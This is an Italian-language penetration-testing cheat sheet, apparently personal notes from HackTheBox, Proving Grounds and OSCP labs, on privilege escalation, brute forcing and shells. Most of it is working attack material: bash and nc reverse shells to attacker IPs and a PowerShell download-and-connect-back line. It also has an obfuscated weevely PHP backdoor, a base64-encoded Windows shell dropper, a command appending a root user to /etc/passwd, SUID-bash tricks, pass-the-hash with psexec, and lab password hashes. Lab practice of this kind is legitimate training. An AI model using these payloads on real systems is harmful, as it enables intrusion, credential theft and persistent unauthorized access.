### URL Encode-Decode
https://www.url-encode-decode.com/


### Diffie-Hellman (SSH)
-oKexAlgorithms=+diffie-hellman-group1-sha1


### pspy
pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.
https://github.com/DominicBreuker/pspy


### Mingw Linux
https://stackoverflow.com/questions/15986715/how-do-i-invoke-the-mingw-cross-compiler-on-linux

I binari sono:

- gcc-mingw-w64-x86-64
- g++-mingw-w64-x86-64
- binutils-mingw-w64-x86-64
- mingw-w64-x86-64-dev
- gcc-mingw-w64-i686
- g++-mingw-w64-i686
- binutils-mingw-w64-i686
- mingw-w64-i686-dev

Quindi, per esempio:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Dibble]
└─$ /usr/bin/x86_64-w64-mingw32-gcc privesc.c -l ws2_32 -o bd.exe
```


### Oracle DB
https://0xdf.gitlab.io/2018/08/04/htb-silo.html --> molte cose con odat

sidguesser con odat
bruteforce
Accesso:
```
sqlplus SCOTT/tiger@10.10.10.82:1521/XE
```

### Memdump
https://0xdf.gitlab.io/2018/08/04/htb-silo.html

Se si trova un file dump, per esempio SILO-20180105-221806.dmp, si usa **volatility** per cercare informazioni dal dump.
Prima si deve cercare il profilo da utilizzare, quindi prima si vede il sistema operativo:
```
PS C:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

E poi si cerca il profilo che deve combaciare con quello del sistema operativo, utilizzando **kdbgscan**:
```
root@kali:~/hackthebox/silo-10.10.10.82# volatility kdbgscan -f SILO-20180105-221806.dmp
**************************************************
Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)
Offset (V)                    : 0xf80078520a30
Offset (P)                    : 0x2320a30
KdCopyDataBlock (V)           : 0xf8007845f9b0
Block encoded                 : Yes
Wait never                    : 0xd08e8400bd4a143a
Wait always                   : 0x17a949efd11db80
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): Win2012R2x64_18340
Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
Service Pack (CmNtCSDVersion) : 0
Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
Major (OptionalHeader)        : 6
Minor (OptionalHeader)        : 3
KPCR                          : 0xfffff8007857b000 (CPU 0)
KPCR                          : 0xffffd000207e8000 (CPU 1)

**************************************************
...
```

E poi si trova prima l'offset e poi si usa hashdump per estrarre gli hash:
```


root@kali:~/hackthebox/silo-10.10.10.82# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat

root@kali:~/hackthebox/silo-10.10.10.82# volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```


### Pass-the-Hash
https://0xdf.gitlab.io/2018/08/04/htb-silo.html

se si hanno gli hash:
```
root@kali:~/hackthebox/silo-10.10.10.82# /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82
 administrator@10.10.10.82
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.82.....
[*] Found writable share ADMIN$
[*] Uploading file XryxqKFr.exe
[*] Opening SVCManager on 10.10.10.82.....
[*] Creating service PAYb on 10.10.10.82.....
[*] Starting service PAYb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```



### Windows Exploits
https://github.com/abatchy17/WindowsExploits

Liste di exploit: https://github.com/51x/WHP

**MS15-051**
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip
Preso da https://0xdf.gitlab.io/2019/03/12/htb-bastard.html

**MS10-059**
https://0xdf.gitlab.io/2020/05/19/htb-arctic.html
Con chimichurri: https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri

Si mette prima un listener (nc -lnvp 443) e poi si esegue:
```
C:\ProgramData>.\Chimichurri.exe 10.10.14.47 443
.\Chimichurri.exe 10.10.14.47 443
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```
**MS16-032**
https://0xdf.gitlab.io/2021/03/17/htb-optimum.html


### WindowsScheduler
https://medium.com/dont-code-me-on-that/tryhackme-hackpark-room-writeup-ba43be376d8b

splinterware System Scheduler Pro 5.12 - 45072.txt

Praticamente cambia il file Message.exe. Gli mette una reverse shell che dopo un tot di tempo verrà eseguita perchè è un task del Windows Scheduler.


### Windows Registry Autologon
https://0xdf.gitlab.io/2018/07/15/htb-bart.html

Si possono trovare credenziali:
```
C:\inetpub\wwwroot\internal-01\log>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    DefaultDomainName    REG_SZ    DESKTOP-7I3S68E
    DefaultUserName    REG_SZ    Administrator
    DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb
```

E poi queste credenziali si possono usare:
**run as**
```
PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```

**net use**
```
PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
The command completed successfully.

PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> x:
PS X:\> cd users\administrator\desktop
PS X:\users\administrator\desktop> ls


    Directory: X:\users\administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/02/2018     12:51             32 root.txt
```

### Watson
Esempio in: https://0xdf.gitlab.io/2019/03/05/htb-devel.html

Se per esempio, Watson dà come output:
```
[*] Appears vulnerable to MS10-073
   [>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
   [>] Exploit: https://www.exploit-db.com/exploits/36327/
   [>] Notes: None.

  [*] Appears vulnerable to MS10-092
   [>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
   [>] Notes: None.

  [*] Appears vulnerable to MS11-046
   [>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
   [>] Exploit: https://www.exploit-db.com/exploits/40564/
   [>] Notes: None.

  [*] Appears vulnerable to MS12-042
   [>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
   [>] Exploit: https://www.exploit-db.com/exploits/20861/
   [>] Notes: None.

  [*] Appears vulnerable to MS13-005
   [>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
   [>] Notes: None.
```

Si può cercare se qualche codice di vulnerabilità è presente nella lista degli exploit di windows https://github.com/abatchy17/WindowsExploits


### Express (nodeJS)
Nel codice JS del client c'è **app.js** in cui si potrebbero trovare i path delle api da cui si possono avere informazioni, per esempio si trovano le api degli utenti e facendo la richiesta si trovano info:
```
oxdf@parrot$ curl -s 10.10.10.58:3000/api/users/ | jq .
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```


### DNS (port 53)
[Preso da macchina Cronos di HTB]
Se, ad esempio, con l'ip non viene indirizzato a nulla, potrebbe essere perchè non riesce a risolvere l'ip. Quindi si usa nlookup per vedere l'hostname.
```
(base) ┌──(kali㉿kali)-[~/Documents/OSCP/ExamSimulation/Cronos]
└─$ nslookup     
> SERVER 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 127.0.0.1
1.0.0.127.in-addr.arpa	name = localhost.
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
> quit
```

E poi dig per vede se ci sono altri domini che ci possono essere utili.

```
(base) ┌──(kali㉿kali)-[~/Documents/OSCP/ExamSimulation/Cronos]
└─$ dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.16.8-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 31 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Sat Jun 19 07:56:47 EDT 2021
;; XFR size: 7 records (messages 1, bytes 203)
```

**Per trovare i subdomain si può usare anche gobuster**:
```
gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### Php (simple-backdoor)

Nel seguente path c'è uno script php che non fa altro che creare una webshell con cui interagire tramite il parametro **cmd** in get nell'url:
/usr/share/webshells/php/simple-backdoor.php

Per esempio:
http://192.168.114.46:242/simple-backdoor.php?cmd=whoami


### PHP Type Juggling
In php se un NULL è comparato con 0 allora verrà vero.
Se si ha un login, si può provare a inserire:
```
username=admin&password[]=
```
E, se vulnerabile a type juggling, allora sarà vero e sarà eseguito il login.

Il codice vulnerabile è:
```
if(strcmp($_REQUEST['password'], $password) == 0)
```
Esempi di input "giusti":
```
php > strcmp("admin", "0xdf");
php > echo strcmp("admin", "0xdf");
1
php > echo strcmp("admin", "admin0xdf");
-4
php > echo strcmp("admin", "admin");
0
```

Esempio di input "sbagliato":
```
php > echo strcmp(array(), "admin");
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
```
Quindi per capire:
```
php > if (strcmp(array(), "admin") == 0) { echo "oops"; }
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
oops
```

Esempio da https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#box-stats




### Creare utente root da inserire in /etc/passwd (Linux)
```
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Le credenziali saranno quindi root2:evil

Per creare quella password, basta eseguire:
```
student@debian:~$ openssl passwd evil
AK24fcSx2Il3I
```

### NmapAutomator
Da root:
```
└─# ./nmapAutomator.sh -H 192.168.128.127 -t Port 

└─# ./nmapAutomator.sh -H 192.168.128.127 -t Full 

└─# ./nmapAutomator.sh -H 192.168.128.127 -t Vulns                 
```

### Find password in registry REG (Windows)
```
C:\Users\Public>reg query HKLM /f pass /t REG_SZ /s
[...]

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control
    CurrentPass    REG_SZ    TwilightAirmailMuck234

[...]
```

### Crontab
cat /etc/crontab

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/3 * * * *   root    python /var/www/html/booked/cleanup.py
```
L'ultima linea significa che quel file verrà eseguito **ogni 3 minuti**.

https://howto.webarea.it/linux/utilizzo-di-crontab-per-schedulare-processi-con-esempi-sotto-linux_1


### Writable folder (Linux)
```
find / -writable -type d 2>/dev/null
```

### Armageddon - HTB
mysql -u drupaluser -pPASSWORD -e 'show databases;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'show tables;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select * from users;'
mysql -u drupaluser -pPASSWORD -D drupal -e 'select name,pass from users;'

mysql -u john -phiroshima -e 'SHOW VARIABLES LIKE "%version%";'


#### UPDATE in mysql 
Trovato ma non ricordo perchè mi ha fatto entusiasmare tanto, però lo scrivo:
```
UPDATE `wp_users` SET `user_pass`= MD5('bypassed') WHERE `user_login`='admin';
```


### MongoDB
https://0xdf.gitlab.io/2021/06/08/htb-node.html

Se in qualche file si trova:
```
const url = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
```

Ci si può connetttere:
```
mark@node:/$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> 
```
E poi vedere le collection:
```
> show collections
tasks
```
E vedere gli oggetti nella collection:
```
> db.tasks.find()
```

#### Insert
Nell'esempio in https://0xdf.gitlab.io/2021/06/08/htb-node.html c'era un pezzo di codice che eseguiva quello che c'era nel db e quindi si inseriscono i comandi:
```
> db.tasks.insert({"cmd": "touch /tmp/0xdf"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("60b6e551e6bccdfbc52f13ca"), "cmd" : "touch /tmp/0xdf" }
```
Oppure per reverse shell:
```
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("60b6e61ee6bccdfbc52f13cb"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'" }
```

In questo esempio (https://0xdf.gitlab.io/2021/06/08/htb-node.html) si inserisce 


### windows-exploit-suggester.py
https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html

Usare python2.7.

Prima eseguire:
```
./windows-exploit-suggester.py --update 
```
Questo genera il file .xls.
python windows-exploit-suggester.py --database <xls database  of exploits provided with the script> --systeminfo <systeminfo saved in a txt file> --ostext <Os> -l


root@kali# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-28-mssb.xls --systeminfo systeminfo



TryHackMe - Retro (altro privilege escalation molto interessante):
https://muirlandoracle.co.uk/2020/01/06/retro-write-up/


### Hydra
└─$ Wordpress
```
hydra -l elliot -P fsocity.dic 192.168.1.192 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.1.192%2Fwp-admin%2F&testcookie=1:F=is incorrect'
```

└─$ SSH
(In questo caso sto facendo bruteforce sul nome dell'utente)
```
hydra -L users.txt -p "plbkac" 192.168.1.14 -t 4 ssh
```

└─$ FTP
```
hydra -l admin -P ~/Documents/rockyou.txt -e nsr -f ftp://192.168.114.46
```
└─$ RDP
```
hydra -t 1 -V -f -l ALICE -P /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt rdp://10.11.1.5
```

### SSH Bruteforce
Hydra
```
kali@kali:~$ hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.120.85 -t 4 -w 5 -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-25 09:00:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://192.168.120.85:22/
[22][ssh] host: 192.168.120.85   login: patrick   password: patrick
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-25 09:00:40
```

Medusa
```
kali@kali:~$ medusa -h 192.168.120.85 -U users.txt -P users.txt -M ssh -e ns -f -g 5 -r 0 -b -t 2 -v 4
ACCOUNT FOUND: [ssh] Host: 192.168.120.85 User: patrick Password: patrick [SUCCESS]
```

Ncrack
```
kali@kali:~$ ncrack 192.168.120.85 -U users.txt -P users.txt -p ssh -f -v

Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-25 09:03 EDT

Discovered credentials on ssh://192.168.120.85:22 'patrick' 'patrick'
ssh://192.168.120.85:22 finished.

Discovered credentials for ssh on 192.168.120.85 22/tcp:
192.168.120.85 22/tcp ssh: 'patrick' 'patrick'

Ncrack done: 1 service scanned in 3.01 seconds.
Probes sent: 1 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.
```


### Gobuster
```
gobuster dir -u http://192.168.199.47 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,sql,bck,html,php,phtml,asp -b 404 -k
```

### Download - Linux
Se non c'è nè wget nè curl:
https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et

```
/usr/bin/printf 'GET /26368.c \n' | nc 192.168.1.125 80 > exp.c
```


### Apache
FreeBSD
	/usr/local/etc/apache22/httpd.conf


### Altri file di log:
/var/log/sendmail.st.0
/root/.history
/var/log/httpd-access.log
/var/log/httpd-error.log
/usr/local/ossec-hids/logs/alerts/alerts.log
/var/log/messages
/var/log/lpd-errs
/var/log/auth.log
/var/log/maillog
/var/log/security
/var/log/userlog
/var/log/xferlog
/var/log/cron
/var/log/sendmail.st
/var/log/utx.lastlogin
/var/log/utx.log
/var/log/ppp.log
/var/log/debug.log

### Cron File
Se si ha un file che viene eseguito da un cron job ma la reverse shell non va, si può creare un il file /bin/bash e poi fargli dare i permessi di root:
```
echo "cp /bin/bash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh
```

E poi eseguirlo con "-p" per mantenere i permessi:
```
/tmp/exploit -p
```

Esempio preso da https://medium.com/@Kan1shka9/stapler-1-walkthrough-e1f2a667ea4


### Zip command gtfo
Avendo i permessi di eseguire il comando zip con sudo senza password:
```
sudo zip /tmp/test.zip /home/zico/wordpress -T --unzip-command="sh -c /bin/bash"
```

I take the --unzip-command option which is available in zip command to run the bash shell while zipping the file.
Esempio preso da https://hackingresources.com/zico2-vulnhub-walkthrough/

### Tar gtfo
https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html

**--to-command**
```
www-data@TartarSauce:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
www-data@TartarSauce:/dev/shm$ tar -cvf a.tar a.sh
a.sh
```
E poi (avviando prima un listener) si esegue:
```
www-data@TartarSauce:/dev/shm$ sudo -u onuma tar -xvf a.tar --to-command /bin/bash
```
E questo crea una reverse shell.

**--checkpoint-action**
```
www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
<ll /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
onuma@TartarSauce:/$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
```

In https://0xdf.gitlab.io/2020/08/13/htb-joker.html invece il tar era in un cronjob e lui si fa una reverse shell che mette poi nella cartella in cui viene eseguito tar.


### Chmod gtfo
```
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /bin/chmod
```

Allora:
```
bash-3.2$ ls -l /bin/bash
-rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash-3.2$ sudo chmod 4755 /bin/bash
bash-3.2$ 

**–to-command**ls -l /bin/bash
-rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
```

Ed eseguire:
```
bash-3.2$ bash -p
bash-3.2# id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
```

### systemctl gtfo
Vedi esempio: https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html

A service is defined by a .service file. The systemctl is used to link it to systemd, and then used again to start the service. What the service does is defined by the .service file.

gtfobins has a page for systemctl, and it gives an example where a single command is executed and output to a file in tmp. I’ll modify that slightly to give me a shell.
```
pepper@jarvis:/dev/shm$ cat >0xdf.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
EOF
```
Now I use systemctl to link this service:
```
pepper@jarvis:/dev/shm$ systemctl link /dev/shm/0xdf.service
```
Now start the service, with a nc listener ready to catch the shell:
```
pepper@jarvis:/dev/shm$ systemctl start 0xdf
```
My listener gets a shell:
```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37160.
id
uid=0(root) gid=0(root) groups=0(root)
```

Oppure:
In pop.service:
```
[Service]
Type=oneshot
ExecStart=/bin/chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

E poi:
```
cd /var/www/html/assets/images
echo
W1NlcnZpY2VdClR5cGU9b25lc2hvdApFeGVjU3RhcnQ9L2Jpbi9jaG1vZCB1K3MgL2Jpbi9iYXNoCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAoK | base64 -d > pop.service
chmod 777 pop.service
/bin/systemctl enable /var/www/html/assets/images/pop.service
/bin/systemctl start pop.service
/bin/bash -p
```


### Reverse shell php:
<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/'10.8.80.159'/4444 0>&1'\");?>

<?php system($_GET['cmd']); ?>

Se si vuole obfuscata:
```
(base) ┌──(kali㉿kali)-[~/Programs/RsaCtfTool]
└─$ weevely generate password a.php
Generated 'a.php' with password 'password' of 774 byte size.
                                                                                                                                                                                                                                     
(base) ┌──(kali㉿kali)-[~/Programs/RsaCtfTool]
└─$ cat a.php 
<?php
$U='|c$k="5f|c4dcc3b"|c;$kh=|c"5aa7|c65|cd61d83";$kf="2|c7deb882c|cf9|c9";$p="b';
$n='tch("/$kh(.+)$kf|c/"|c,@file|c_get_co|cnte|cnts|c("p|chp://input"),$m)=|c';
$u='$j++,$i++|c){$|co.=$t{$i}|c^$k{$j}|c;}}|creturn $|co|c;}if|c |c|c(@preg_ma';
$w='|c$m[1]),$k)))|c;$o=@|cob_get|c_conte|cnts();@|c|cob_end_cle|can();$r|c=|c';
$m='@bas|ce64_encod|ce(@x(@gz|ccompress(|c$o),$k|c))|c;print(|c|c"$p$kh$r$kf");}';
$x='trlen|c($t);$o="";f|cor($i=0|c|c;$i<$l;){fo|cr($|cj=0;($j<$c&|c&$i<|c$l);|c';
$N='=1)|c {@ob_sta|crt();@|ceva|cl(@gzuncom|cpr|ces|cs(@x(@base6|c4_d|cecode(';
$H=str_replace('P','','PPcPrePate_funPcPtion');
$O='ZZ|crmT4ju|coLEBL|cYg";f|cun|cction x($t|c,$k){$c=str|clen($|ck);|c$|cl=s';
$E=str_replace('|c','',$U.$O.$x.$u.$n.$N.$w.$m);
$q=$H('',$E);$q();
?>
```
https://github.com/epinna/weevely3


### Php + Powershell (Windows):
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.8.80.159/nc.exe','nc.exe'); cmd /c nc.exe 10.8.80.159 4444 -e cmd.exe\" }"); ?>

#### windows-php-reverse-shell
https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
```
<?php
header('Content-type: text/plain');
$ip   = "192.168.1.9"; //change this 
$port = "1234"; //change this
$payload = "7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWqcx0VqLK+4XIBw7vhEr9VooKylIoMpVAGpQnlcgUMpYohpVoOSeRQSHQcJFOIxB42NiT22xoxoQDAw+CAH1KaY/9dtw+g4cgYrAMAoQEd1ZPopwG1lai2v13dDI59s27M2/W/TX4zhwru9Qi9jem/4fTfbwKt54cB/mPZagIA5n+QlxCT5PnaOfm7BWH/cn37UJ7Xv7fxev+z/srjvOF5/7a59rccu7/wTD4enitmvtzFxhprXWZ0rHvn3Z0jVw8CQCEVZbgBwCIACBhqQ5A47 ....
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);	            
?>
```

### Spawn an interactive shell 
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import pty; pty.spawn("cmd.exe")'


### Python shell
https://0xdf.gitlab.io/2018/11/30/htb-hawk.html

Se ci fosse una shell in python dopo il login e quindi in /etc/passwd sarebbe:
```
www-data@hawk:/var/www/html$ grep daniel /etc/passwd
daniel:x:1002:1005::/home/daniel:/usr/bin/python3
```
Si può fare escape:
```
>>> import subprocess
>>> subprocess.call('/bin/bash', shell=True)
daniel@hawk:/var/www/html$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
```
Oppure usando:
```
pty.spawn("/bin/bash")
```

### Nikto
nikto -h $IP

### Rsync
Vedi Fail di Providing Grounds.

List folder:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Fail]
└─$ sudo nmap -sV --script "rsync-list-modules" -p 873 192.168.199.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 10:06 EDT
Nmap scan report for 192.168.199.126
